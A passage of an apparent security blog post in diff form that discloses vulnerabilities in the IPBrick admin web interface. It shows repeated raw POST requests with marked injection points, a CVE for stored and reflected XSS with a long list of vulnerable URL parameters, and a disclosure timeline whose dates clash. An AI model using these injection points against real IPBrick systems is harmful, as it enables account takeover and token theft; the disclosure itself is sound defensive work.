name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.ph
+-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+---------------------------9988894693323536491681056513
+Content-Length: 540
+-----------------------------9988894693323536491681056513
+Content-Disposition: form-data; name="pagina"
+voip_placas_pstn_inserir
+-----------------------------9988894693323536491681056513
+Content-Disposition: form-data; name="tipoplaca"
+115561371*
+-----------------------------9988894693323536491681056513
+Content-Disposition: form-data; name="manufacturer"
+6
+-----------------------------9988894693323536491681056513
+Content-Disposition: form-data; name="numportas"
+1
+-----------------------------9988894693323536491681056513--
+
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+-----------------------------11122813211374287858922608002
+Content-Disposition: form-data; name="pagina"
+webmail_alterado
+-----------------------------11122813211374287858922608002
+Content-Disposition: form-data; name="imap_server"
+ipbrick.domain.com
+-----------------------------11122813211374287858922608002
+Content-Disposition: form-data; name="smtp_server"
+ipbrick.domain.com
+-----------------------------11122813211374287858922608002
+Content-Disposition: form-data; name="db_server"
+localhost
+-----------------------------11122813211374287858922608002
+Content-Disposition: form-data; name="login_patch"; filename=""
+Content-Type: application/octet-stream
+-----------------------------11122813211374287858922608002
+Content-Disposition: form-data; name="logo_patch"; filename=""
+Content-Type: application/octet-stream
+-----------------------------11122813211374287858922608002
+Content-Disposition: form-data; name="can_export"
+t
+-----------------------------11122813211374287858922608002
+Content-Disposition: form-data; name="admin_users"
+10000
+-----------------------------11122813211374287858922608002
+Content-Disposition: form-data; name="admin_prefs"
+administrator
+-----------------------------11122813211374287858922608002
+Content-Disposition: form-data; name="tb_plugin_calendar_info"
+1
+-----------------------------11122813211374287858922608002
+Content-Disposition: form-data; name="tb_plugin_show_company_logo"
+1*
+-----------------------------11122813211374287858922608002
+Content-Disposition: form-data; name="tb_plugin_recur_hide_never"
+0
+-----------------------------11122813211374287858922608002
+Content-Disposition: form-data; name="tb_plugin_recur_one_year_max"
+0
+-----------------------------11122813211374287858922608002
+Content-Disposition: form-data; name="resources_executing_state"
+0
+-----------------------------11122813211374287858922608002
+Content-Disposition: form-data; name="resources_resource_users"
+-----------------------------11122813211374287858922608002
+Content-Disposition: form-data; name="resources_executing_interval"
+2
+-----------------------------11122813211374287858922608002
+Content-Disposition: form-data; name="lastrmt"
+1
+-----------------------------11122813211374287858922608002
+Content-Disposition: form-data; name="event_type_name[1]"
+-----------------------------11122813211374287858922608002
+Content-Disposition: form-data; name="event_type_doAction[1]"
+1
+-----------------------------11122813211374287858922608002
+Content-Disposition: form-data; name="event_type_action[1]"
+-----------------------------11122813211374287858922608002
+Content-Disposition: form-data; name="show_alt_emails"
+0
+-----------------------------11122813211374287858922608002
+Content-Disposition: form-data; name="horde_signature"
+-----------------------------11122813211374287858922608002
+Content-Disposition: form-data; name="f_accao"
+Modify
+-----------------------------11122813211374287858922608002--
+
+</code></pre>
+</div>
+
+<p><strong>CVE-2018-16138 (Cross-Site Scripting) XSS</strong></p>
+
+<p>Another Vulnerability found was XSS in ALL THE ADMINISTRATION PAGE. Looks like they don’t like to sanitize input. As seen on my other <a href="http://www.cncs.pt">post</a> This vulnerability can be leveraged to inject JavaScript code and steam authentication tokens, as well as compromise clients if there is an exploit for their browser. Its consider a high severity vulnerability and should not be found in any application let alone one that handles the security of the whole enterprise.</p>
+
+<p>Persistent and reflective XSS attacks can be made in this application, for example, for any chance if a user is registered using a payload it will present on the web page if consulting the user list. This is risky since any kind of problems could arise from it.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>*List of detected XSS vulnerable inputs*
+
+* /corpo.php?pagina=insere_licenca&amp;activationcode=1ej5k3*sjnkukola1o&amp;f_accao_file=Licence File
+* /corpo.php?pagina=voip_asterisk_manager&amp;alterar=*
+* /corpo.php?pagina=voip_asterisk_manager&amp;reload=1&amp;alterar=*&amp;activar=t
+* /corpo.php?pagina=voip_options_alterar_altera&amp;option=callcenter&amp;in_estado_acd_remoto=t&amp;in_ip_ACD=&amp;in_suf_ACD=&amp;status_send_queue_log=t&amp;extra_send_queue_log_ip=*&amp;extra_send_queue_log_port=&amp;status_send_queue_log_share=t&amp;extra_send_queue_log_share_ip=&amp;extra_send_queue_log_share_folder=&amp;extra_send_queue_log_share_login=admin&amp;extra_send_queue_log_share_pwd=123456&amp;extra_send_queue_log_share_period=1&amp;extra_send_queue_log_share_hour=0&amp;f_accao=Modify
+* /corpo.php?pagina=voip_options_alterar_altera&amp;option=callcenter&amp;in_estado_acd_remoto=t&amp;in_ip_ACD=&amp;in_suf_ACD=&amp;status_send_queue_log=t&amp;extra_send_queue_log_ip=&amp;extra_send_queue_log_port=&amp;status_send_queue_log_share=t&amp;extra_send_queue_log_share_ip=*&amp;extra_send_queue_log_share_folder=&amp;extra_send_queue_log_share_login=admin&amp;extra_send_queue_log_share_pwd=123456&amp;extra_send_queue_log_share_period=1&amp;extra_send_queue_log_share_hour=0&amp;f_accao=Modify
+* /corpo.php?pagina=maquinas_inserir&amp;f_type=1&amp;f_nome=1&amp;f_gidnumber=802&amp;f_ip1=192&amp;f_ip2=168&amp;f_ip3=69&amp;f_ip4=111&amp;f_mac1=&amp;f_mac2=&amp;f_mac3=&amp;f_mac4=&amp;f_mac5=&amp;f_mac6=*
+* /corpo.php?pagina=show_log&amp;file=*&amp;file2=
+* /corpo.php?pagina=show_log&amp;file=system-1519780916.tgz&amp;file2=*
+* /corpo.php?pagina=manage_access_log_adv_alt&amp;id_access=*
+* /corpo.php?pagina=voip_options_alterar_altera&amp;option=callcenter&amp;in_estado_acd_remoto=t&amp;in_ip_ACD=*&amp;in_suf_ACD=&amp;status_send_queue_log=t&amp;extra_send_queue_log_ip=&amp;extra_send_queue_log_port=&amp;status_send_queue_log_share=t&amp;extra_send_queue_log_share_ip=&amp;extra_send_queue_log_share_folder=&amp;extra_send_queue_log_share_login=admin&amp;extra_send_queue_log_share_pwd=123456&amp;extra_send_queue_log_share_period=1&amp;extra_send_queue_log_share_hour=0&amp;f_accao=Modify
+* /corpo.php?pagina=voip_interface_pstn_inserir&amp;nomeinterface=*&amp;tipointerface=NT&amp;opensippeers=0&amp;rxgain=0&amp;txgain=0&amp;fqdn=&amp;msip=&amp;intechocancel=G
+* /corpo.php?pagina=utilizador_ver_lista&amp;offset=*&amp;first_char=&amp;pesq_nome=
+* /corpo.php?pagina=utilizador_ver_lista&amp;offset=*&amp;first_char=&amp;pesq_nome=
+* /corpo.php?pagina=voip_options_alterar_altera&amp;option=*&amp;dnat=f&amp;voip_public_ip_type_options=0&amp;voip_public_ip_value1_options=&amp;voip_listen_public_ip_type_options=0&amp;voip_listen_public_ip_value1_options=10.0.0.253&amp;int_voip=1&amp;direct_rtp_setup=f&amp;rmzero=f&amp;contacts_server=local&amp;cid_ldapsrv=127.0.0.1&amp;cid_dnsdomain=domain.com&amp;username_remote=admin&amp;password_remote=123456&amp;cid_search=f&amp;cid_search_internal=f&amp;address_restrict=f&amp;voip_pbx_asterisk_answer=t&amp;voip_att_timeout_options=30&amp;voip_call_timeout_options=120&amp;rtp_timeout=600&amp;rtp_hold_timeout=700&amp;agent_timeout_status=f&amp;agent_timeout_extra=30&amp;reg_expire_default=3600&amp;reg_expire_max=3600&amp;qualify_freq=60&amp;reg_attempts=0&amp;sip_videosupport=t&amp;voipoptions_est_directory_users_ext=f&amp;voipoptions_ext_directory_users_ext=*61&amp;voipoptions_ext_directory_users_searchby=lastname&amp;estatttransfer=f&amp;extatttransfer=*1&amp;estbldtransfer=f&amp;extbldtransfer=#1&amp;estado_pickup_ext=t&amp;extra_pickup_ext=*8&amp;estado_pickup_ext_grp=f&amp;extra_pickup_ext_grp=*7&amp;estado_pickup_ext_global=t&amp;extra_pickup_ext_global=*8&amp;extra_pickup_mode=1&amp;estado_block_ext=f&amp;extra_block_ext=*76&amp;estado_unblock_ext_code=f&amp;extra_unblock_ext_code=123456&amp;estado_dnd_ena_ext=f&amp;extra_dnd_ena_ext=*73&amp;extra_dnd_dis_ext=*74&amp;estado_cfw_all_ena_ext=f&amp;extra_cfw_all_ena_ext=*70&amp;estado_cfw_bsy_ena_ext=f&amp;extra_cfw_bsy_ena_ext=*72&amp;estado_cfw_noanw_ena_ext=f&amp;extra_cfw_noanw_ena_ext=*71&amp;estado_acfw_noanw_ena_ext=f&amp;accao_acfw_noanw_ena_ext=0&amp;extra_acfw_noanw_ena_ext=0&amp;estado_retrydial_busy_ena_ext=f&amp;extra_retrydial_busy_ena_ext=5&amp;extra_retrydial_busy_timeout=60&amp;extra_retrydial_busy_restrict=0&amp;estado_barge_ext=f&amp;extra_barge_ext=*9&amp;estado_audio_recording_byphone=f&amp;extra_audio_recording_byphone_seq=*60&amp;extra_audio_recording_byphone_pinauth=&amp;estado_callscreen_ext=f&amp;extra_callscreen_ext=*64&amp;moh_enable=f&amp;id_moh=1&amp;estado_callscreen_callerid_anonymous_ena=f&amp;estado_callscreen_save_records=f&amp;estado_callscreen_automatic_answer=f&amp;prioritizacao=f&amp;estado_recording_demand=f&amp;estado_recording_cache=f&amp;estado_adv_call_stats=f&amp;conta_ftp=f&amp;estado_voip_high_resolution_time=t&amp;estado_dbreporting=f&amp;extra_dbreporting=&amp;ip_media=f&amp;simetric_rtp=t&amp;estado_chef_secretary=f&amp;extra_chef_secretary=*79&amp;forwarding_messages=t&amp;dial_separator=#&amp;estado_click2dial_msg=f&amp;distinctive_ring=t&amp;estado_password_policies=t&amp;extra_password_policies=8&amp;default_call_limit=2&amp;addsipportscount=1&amp;addsipports_0=5060&amp;tls_port=5061&amp;iax_port=4569&amp;extra_udp_error_control=fec&amp;estado_sip_tos=f&amp;sip_tos_0=cs3&amp;sip_tos_1=ef&amp;sip_tos_2=af41&amp;sip_tos_3=af41&amp;estado_iax_tos=f&amp;iax_tos_0=ef&amp;estado_sip_cos=f&amp;sip_cos_0=3&amp;sip_cos_1=5&amp;sip_cos_2=4&amp;sip_cos_3=3&amp;estado_iax_cos=f&amp;iax_cos_0=5&amp;extra_channel_tonezone=pt&amp;f_accao=Modify&amp;addsipports_=   (C'mon!! at least change this to post data!)
+* /corpo.php?pagina=utilizador_ver_lista&amp;offset=0&amp;first_char=&amp;pesq_nome=*
+* /corpo.php?pagina=vpnssl_policies_ins&amp;policy=*
+
+* /manual/index.php?node=undefined&amp;man_lang=*
+* /manual/index.php?node=*&amp;man_lang=undefined
+</code></pre>
+</div>
+
+<p>Every input in this application should be sanitized to prevent exploitation of all these vulnerabilities and implement an antiCSRF token.</p>
+
+<p><strong>Advisory Note</strong>
+If you look closely, you’ll find that I skipped a lot of injection points. The reason is that I was fed up of discovering things. Sorry about that, but just choose a form and test it. There is a probability that has something wrong in it.</p>
+
+<p><strong>TimeLine</strong></p>
+
+<p>*29/08/18 - CVE Request</p>
+
+<p>*30/08/2018 - Contacted IPBrick to send details</p>
+
+<p>*25/10/2018 - No response from IPBrick</p>
+
+<p>*06/11/2018 - Contacted CSIRT since several critical institutions were vulnerable</p>
+
+<p>*14/11/2018 - Response from IPBrick stating they will analyze the incident</p>
+
+<p>*03/12/2018 - Email sent, no updates on the matter</p>
+
+<p>*20/01/2018 - Email sent, no updates on the matter</p>
+
+<p>*26/12/2018 - Response stating that by the end of January a fix will be provided</p>
+
+<p>*03/01/2019 - It’s February, disclosing it</p>
+
+  </div>
+
+</article>
+
+      </div>
+    </div>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">0x90</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li>0x90</li>
+          <li><a href="mailto:pedrosousarodrigues@protonmail.com">pedrosousarodrigues@protonmail.com</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-2">
+        <ul class="social-media-list">
+          
+          <li>
+            <a href="https://github.com/psrodrigues"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
+</span><span class="username">psrodrigues</span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="https://twitter.com/Pedro_SEC_R"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
+</span><span class="username">Pedro_SEC_R</span></a>
+
+          </li>
+          
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-3">
+        <p>"0x90" Zone (or NoOperation Zone). There is actually nothing to see here. This website is for my personal infosec research. Opinions are mine only. It's a blog, you can find some articles about what I get in the field. Constructive comments are welcome. Have fun, stay safe.
+</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
